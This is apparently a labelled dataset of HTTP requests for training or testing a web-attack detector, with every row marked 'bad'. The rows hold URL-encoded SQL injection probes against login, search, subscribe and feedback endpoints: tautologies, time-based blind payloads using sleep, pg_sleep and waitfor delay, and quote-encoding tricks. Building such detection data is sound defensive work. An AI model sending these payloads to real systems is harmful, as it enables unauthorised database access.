,method,body,path,single_q,double_q,dashes,braces,spaces,badwords,class
99,POST,b'cfile=-1%27%20or%20%2724%27%3d%2724&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
100,GET,b'',b'/-1%27%20or%20%2756%27%3d%2756.htm',4,0,0,0,2,0,bad
101,POST,b'btnSubmit=%40%40GLO1K&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
102,POST,b'btnSubmit=%40%40mePlV&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
103,GET,b'',b'/search.jsp?query=-1%20or%2084%3d0',0,0,0,0,2,0,bad
104,GET,b'',b'/search.jsp?query=%40%40UgYQX',0,0,0,0,0,0,bad
105,POST,b'btnSubmit=-1%27%20or%20%27103%27%3d%27103&passw=acUn3t1x&uid=1',b'/doLogin',4,0,0,0,2,1,bad
106,POST,b'cfile=JyI%3d&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
107,POST,b'btnSubmit=JyI%3d&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
108,POST,b'btnSubmit=-1%27%20or%20%27102%27%3d%270&txtEmail=sample%40email.tst',b'/doSubscribe',4,0,0,0,2,0,bad
109,GET,b'',b'/-1%27%20or%20%2756%27%3d%270.htm',4,0,0,0,2,0,bad
110,GET,b'',b'/JyI%3d.htm',0,0,0,0,0,0,bad
111,POST,b'cfile=-1%27%20or%20%2724%27%3d%270&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
112,GET,b'',b'/search.jsp?query=-1%20or%2084-82%20%3d%202',0,0,0,0,4,0,bad
113,GET,b'',b'/search.jsp?query=JyI%3d',0,0,0,0,0,0,bad
114,POST,b'btnSubmit=JyI%3d&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
115,POST,b'btnSubmit=-1%27%20or%20%27103%27%3d%270&passw=acUn3t1x&uid=1',b'/doLogin',4,0,0,0,2,1,bad
116,GET,b'',b'/-1%22%20or%20%2269%22%3d%2269.htm',0,4,0,0,2,0,bad
117,POST,b'btnSubmit=-1%22%20or%20%2239%22%3d%2239&txtEmail=sample%40email.tst',b'/doSubscribe',0,4,0,0,2,0,bad
118,POST,b'btnSubmit=%bf%27%bf%22&txtEmail=sample%40email.tst',b'/doSubscribe',1,1,0,0,0,0,bad
119,POST,b'cfile=%bf%27%bf%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
120,GET,b'',b'/%bf%27%bf%22.htm',1,1,0,0,0,0,bad
121,POST,b'cfile=-1%22%20or%20%2287%22%3d%2287&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
122,GET,b'',b'/search.jsp?query=%bf%27%bf%22',1,1,0,0,0,0,bad
123,GET,b'',b'/search.jsp?query=-1%27%20or%20%2774%27%3d%2774',4,0,0,0,2,0,bad
124,POST,b'btnSubmit=%bf%27%bf%22&passw=acUn3t1x&uid=1',b'/doLogin',1,1,0,0,0,1,bad
125,POST,b'btnSubmit=-1%22%20or%20%2211%22%3d%2211&passw=acUn3t1x&uid=1',b'/doLogin',0,4,0,0,2,1,bad
126,POST,b'cfile=%f0%27%27%f0%22%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
127,POST,b'btnSubmit=-1%22%20or%20%2239%22%3d%220&txtEmail=sample%40email.tst',b'/doSubscribe',0,4,0,0,2,0,bad
128,POST,b'btnSubmit=%f0%27%27%f0%22%22&txtEmail=sample%40email.tst',b'/doSubscribe',2,2,0,0,0,0,bad
129,GET,b'',b'/%f0%27%27%f0%22%22.htm',2,2,0,0,0,0,bad
130,GET,b'',b'/-1%22%20or%20%2269%22%3d%220.htm',0,4,0,0,2,0,bad
131,POST,b'cfile=-1%22%20or%20%2287%22%3d%220&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
132,GET,b'',b'/search.jsp?query=-1%27%20or%20%2774%27%3d%270',4,0,0,0,2,0,bad
133,POST,b'btnSubmit=%f0%27%27%f0%22%22&passw=acUn3t1x&uid=1',b'/doLogin',2,2,0,0,0,1,bad
134,GET,b'',b'/search.jsp?query=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
135,POST,b'btnSubmit=-1%22%20or%20%2211%22%3d%220&passw=acUn3t1x&uid=1',b'/doLogin',0,4,0,0,2,1,bad
136,GET,b'',b'/high_yield_investments%27%20and%20sleep%284%29%3d%27.htm',2,0,0,1,2,1,bad
137,POST,b'btnSubmit=Subscribe%27%20and%20sleep%284%29%3d%27&txtEmail=sample%40email.tst',b'/doSubscribe',2,0,0,1,2,1,bad
138,GET,b'',b'/survey_questions.jsp?step=b',0,0,0,0,0,0,bad
139,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
140,POST,b'cfile=comments.txt%27%20and%20sleep%284%29%3d%27&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,4,1,bad
141,GET,b'',b'/search.jsp?query=-1%27%20or%2074-72%20%3d%20%272',2,0,0,0,4,0,bad
142,GET,b'',b'/survey_questions.jsp?step=a',0,0,0,0,0,0,bad
143,POST,b'btnSubmit=Login%27%20and%20sleep%284%29%3d%27&passw=acUn3t1x&uid=1',b'/doLogin',2,0,0,1,2,2,bad
144,POST,b'cfile=comments.txt&comments=1%27%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
145,GET,b'',b'/high_yield_investments%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',1,0,1,2,6,1,bad
146,POST,b'btnSubmit=Subscribe&txtEmail=1%27%22',b'/doSubscribe',1,1,0,0,0,0,bad
147,POST,b'btnSubmit=Subscribe%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,2,6,1,bad
148,POST,b'cfile=comments.txt%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
149,GET,b'',b'/search.jsp?query=-1%22%20or%20%2255%22%3d%2255',0,4,0,0,2,0,bad
150,GET,b'',b'/survey_questions.jsp?step=1%27%22',1,1,0,0,0,0,bad
151,POST,b'btnSubmit=Login&passw=1%27%22&uid=1',b'/doLogin',1,1,0,0,0,1,bad
152,POST,b'btnSubmit=Login%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,2,6,2,bad
153,POST,b'cfile=comments.txt&comments=%5c&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
154,POST,b'btnSubmit=Subscribe&txtEmail=%5c',b'/doSubscribe',0,0,0,0,0,0,bad
155,GET,b'',b'/survey_questions.jsp?step=-1%20or%2017%3d17',0,0,0,0,2,0,bad
156,POST,b'btnSubmit=Subscribe%22%20and%20sleep%284%29%3d%22&txtEmail=sample%40email.tst',b'/doSubscribe',0,2,0,1,2,1,bad
157,GET,b'',b'/high_yield_investments%22%20and%20sleep%284%29%3d%22.htm',0,2,0,1,2,1,bad
158,POST,b'cfile=comments.txt%22%20and%20sleep%284%29%3d%22&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,4,1,bad
159,POST,b'btnSubmit=Login&passw=%5c&uid=1',b'/doLogin',0,0,0,0,0,1,bad
160,GET,b'',b'/search.jsp?query=-1%22%20or%20%2255%22%3d%220',0,4,0,0,2,0,bad
161,POST,b'btnSubmit=Login%22%20and%20sleep%284%29%3d%22&passw=acUn3t1x&uid=1',b'/doLogin',0,2,0,1,2,2,bad
162,POST,b'cfile=comments.txt&comments=1%c0%00xa7%c0%a2&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
163,POST,b'btnSubmit=Subscribe&txtEmail=1%c0%00xa7%c0%a2',b'/doSubscribe',0,0,0,0,0,0,bad
164,GET,b'',b'/high_yield_investments%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',1,0,1,2,6,1,bad
165,POST,b'btnSubmit=Subscribe%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,2,6,1,bad
166,GET,b'',b'/survey_questions.jsp?step=-1%20or%2017%3d0',0,0,0,0,2,0,bad
167,GET,b'',b'/search.jsp?query=-1%22%20or%2055-53%20%3d%20%222',0,2,0,0,4,0,bad
168,POST,b'btnSubmit=Login&passw=1%c0%00xa7%c0%a2&uid=1',b'/doLogin',0,0,0,0,0,1,bad
169,POST,b'btnSubmit=Login%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,2,6,2,bad
170,POST,b'cfile=comments.txt&comments=%40%40vvzyt&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
171,GET,b'',b'/survey_questions.jsp?step=%5c',0,0,0,0,0,0,bad
172,POST,b'btnSubmit=Subscribe&txtEmail=%40%40UM0Vt',b'/doSubscribe',0,0,0,0,0,0,bad
173,POST,b'btnSubmit=Subscribe%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,1,1,2,6,1,bad
174,GET,b'',b'/high_yield_investments%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',0,1,1,2,6,1,bad
175,POST,b'cfile=comments.txt%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
176,GET,b'',b'/survey_questions.jsp?step=-1%27%20or%20%2746%27%3d%2746',4,0,0,0,2,0,bad
177,GET,b'',b'/search.jsp?query=1%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
178,POST,b'btnSubmit=Login&passw=%40%40WI5vh&uid=1',b'/doLogin',0,0,0,0,0,1,bad
179,POST,b'btnSubmit=Login%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',0,1,1,2,6,2,bad
180,POST,b'cfile=comments.txt&comments=JyI%3d&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
181,GET,b'',b'/survey_questions.jsp?step=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
182,POST,b'btnSubmit=Subscribe&txtEmail=JyI%3d',b'/doSubscribe',0,0,0,0,0,0,bad
183,GET,b'',b'/high_yield_investments%27%3dsleep%284%29%3d%27.htm',2,0,0,1,0,1,bad
184,POST,b'cfile=comments.txt%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,1,1,2,8,1,bad
185,POST,b'btnSubmit=Subscribe%27%3dsleep%284%29%3d%27&txtEmail=sample%40email.tst',b'/doSubscribe',2,0,0,1,0,1,bad
186,GET,b'',b'/survey_questions.jsp?step=-1%27%20or%20%2746%27%3d%270',4,0,0,0,2,0,bad
187,POST,b'btnSubmit=Login&passw=JyI%3d&uid=1',b'/doLogin',0,0,0,0,0,1,bad
188,GET,b'',b'/search.jsp?query=1%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,0,1,2,6,1,bad
189,POST,b'btnSubmit=Login%27%3dsleep%284%29%3d%27&passw=acUn3t1x&uid=1',b'/doLogin',2,0,0,1,0,2,bad
190,POST,b'btnSubmit=Subscribe&txtEmail=%bf%27%bf%22',b'/doSubscribe',1,1,0,0,0,0,bad
191,POST,b'cfile=comments.txt&comments=%bf%27%bf%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
192,GET,b'',b'/survey_questions.jsp?step=%40%40RBDGS',0,0,0,0,0,0,bad
193,POST,b'btnSubmit=Subscribe%22%3dsleep%284%29%3d%22&txtEmail=sample%40email.tst',b'/doSubscribe',0,2,0,1,0,1,bad
194,GET,b'',b'/high_yield_investments%22%3dsleep%284%29%3d%22.htm',0,2,0,1,0,1,bad
195,POST,b'cfile=comments.txt%27%3dsleep%284%29%3d%27&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,2,1,bad
196,GET,b'',b'/survey_questions.jsp?step=-1%22%20or%20%22108%22%3d%22108',0,4,0,0,2,0,bad
197,POST,b'btnSubmit=Login&passw=%bf%27%bf%22&uid=1',b'/doLogin',1,1,0,0,0,1,bad
198,GET,b'',b'/search.jsp?query=1%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
199,POST,b'btnSubmit=Login%22%3dsleep%284%29%3d%22&passw=acUn3t1x&uid=1',b'/doLogin',0,2,0,1,0,2,bad
200,POST,b'cfile=comments.txt&comments=%f0%27%27%f0%22%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
201,GET,b'',b'/survey_questions.jsp?step=JyI%3d',0,0,0,0,0,0,bad
202,POST,b'btnSubmit=Subscribe&txtEmail=%f0%27%27%f0%22%22',b'/doSubscribe',2,2,0,0,0,0,bad
203,POST,b'btnSubmit=Subscribe%20and%20sleep%284%29%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,1,3,1,bad
204,GET,b'',b'/high_yield_investments%20and%20sleep%284%29%20.htm',0,0,0,1,3,1,bad
205,POST,b'cfile=comments.txt%22%3dsleep%284%29%3d%22&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,2,1,bad
206,POST,b'btnSubmit=Login&passw=%f0%27%27%f0%22%22&uid=1',b'/doLogin',2,2,0,0,0,1,bad
207,GET,b'',b'/survey_questions.jsp?step=-1%22%20or%20%22108%22%3d%220',0,4,0,0,2,0,bad
208,GET,b'',b'/search.jsp?query=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
209,POST,b'btnSubmit=Login%20and%20sleep%284%29%20&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,1,3,2,bad
210,POST,b'cfile=comments.txt&comments=1&email_addr=3137%2520Laguna%2520Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
211,GET,b'',b'/survey_questions.jsp?step=%bf%27%bf%22',1,1,0,0,0,0,bad
212,GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
213,POST,b'btnSubmit=Subscribe%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,1,2,6,1,bad
214,GET,b'',b'/high_yield_investments%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',0,0,1,2,6,1,bad
215,POST,b'cfile=comments.txt%20and%20sleep%284%29%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,1,5,1,bad
216,GET,b'',b'/survey_questions.jsp?step=b%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
217,POST,b'btnSubmit=Login%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',0,0,1,2,6,2,bad
218,GET,b'',b'/search.jsp?query=1%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
219,POST,b'cfile=comments.txt&comments=1&email_addr=1%27%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,0,0,bad
220,GET,b'',b'/survey_questions.jsp?step=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
221,POST,b'btnSubmit=Subscribe%27%3bselect%20pg_sleep%284%29%3b%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,1,3,2,bad
222,POST,b'cfile=comments.txt%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,2,8,1,bad
223,GET,b'',b'/high_yield_investments%27%3bselect%20pg_sleep%284%29%3b%20--%20.htm',1,0,1,1,3,2,bad
224,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1%27%22',b'/doLogin',1,1,0,0,0,1,bad
225,GET,b'',b'/survey_questions.jsp?step=b%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
226,POST,b'btnSubmit=Login%27%3bselect%20pg_sleep%284%29%3b%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,1,3,3,bad
227,POST,b'cfile=comments.txt&comments=1&email_addr=%5c&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
228,GET,b'',b'/search.jsp?query=1%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
229,GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
230,GET,b'',b'/swagger/-1%20or%2087%3d87.html',0,0,0,0,2,0,bad
231,POST,b'btnSubmit=Subscribe%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',3,0,1,0,5,2,bad
232,POST,b'cfile=comments.txt%27%3bselect%20pg_sleep%284%29%3b%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,1,5,2,bad
233,GET,b'',b'/high_yield_investments%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.htm',3,0,1,0,5,2,bad
234,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%5c',b'/doLogin',0,0,0,0,0,1,bad
235,GET,b'',b'/survey_questions.jsp?step=b%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
236,POST,b'btnSubmit=Login%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',3,0,1,0,5,3,bad
237,POST,b'cfile=comments.txt&comments=1&email_addr=1%c0%00xa7%c0%a2&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
238,GET,b'',b'/search.jsp?query=1%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
239,GET,b'',b'/swagger/1%27%22.html',1,1,0,0,0,0,bad
240,GET,b'',b'/swagger/-1%20or%2087%3d0.html',0,0,0,0,2,0,bad
241,POST,b'btnSubmit=Subscribe%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',2,1,1,0,5,2,bad
242,POST,b'cfile=comments.txt%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',3,0,1,0,7,2,bad
243,GET,b'',b'/high_yield_investments%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.htm',2,1,1,0,5,2,bad
244,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1%c0%00xa7%c0%a2',b'/doLogin',0,0,0,0,0,1,bad
245,GET,b'',b'/survey_questions.jsp?step=b%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
246,POST,b'btnSubmit=Login%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',2,1,1,0,5,3,bad
247,POST,b'cfile=comments.txt&comments=1&email_addr=%40%40oaAzP&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
248,GET,b'',b'/search.jsp?query=1%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
249,GET,b'',b'/swagger/%5c.html',0,0,0,0,0,0,bad
250,GET,b'',b'/swagger/-1%27%20or%20%2749%27%3d%2749.html',4,0,0,0,2,0,bad
251,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
252,POST,b'cfile=comments.txt%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,1,1,0,7,2,bad
253,GET,b'',b'/index.jsp?content=personal_loans.htm',0,0,0,0,0,0,bad
254,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%40%40lWExv',b'/doLogin',0,0,0,0,0,1,bad
255,GET,b'',b'/survey_questions.jsp?step=b%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
256,GET,b'',b'/search.jsp?query=1%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
257,GET,b'',b'/swagger/1%c0%00xa7%c0%a2.html',0,0,0,0,0,0,bad
258,GET,b'',b'/swagger/-1%27%20or%20%2749%27%3d%270.html',4,0,0,0,2,0,bad
259,POST,b'cfile=comments.txt&comments=1&email_addr=JyI%3d&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
260,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=JyI%3d',b'/doLogin',0,0,0,0,0,1,bad
261,GET,b'',b'/survey_questions.jsp?step=b%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
